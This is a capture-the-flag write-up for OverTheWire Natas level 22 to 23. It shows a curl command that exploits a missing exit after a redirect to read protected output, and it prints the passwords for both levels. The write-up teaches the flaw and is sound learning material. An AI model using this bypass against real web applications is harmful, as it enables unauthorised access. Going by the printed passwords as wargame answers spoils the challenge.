# Natas Level 22 to 23

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 22 -> 23 |
| Status | Complete |

## Objective

Read credentials hidden behind a redirect.

## Given Access

User: `natas22`

Password:

```text
d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
```

## Method

When `revelio` is present and the user is not admin, the app sends `Location: /` but does not exit. The protected credentials are still printed later in the response body.

## Commands

```bash
curl -s -i -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz \
  'http://natas22.natas.labs.overthewire.org/?revelio'
```

## Result

Password for `natas23`:

```text
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```

## Lesson

Redirects are not access control. After sending a redirect header, server code must stop execution before sensitive output is generated.

## References

- https://overthewire.org/wargames/natas/
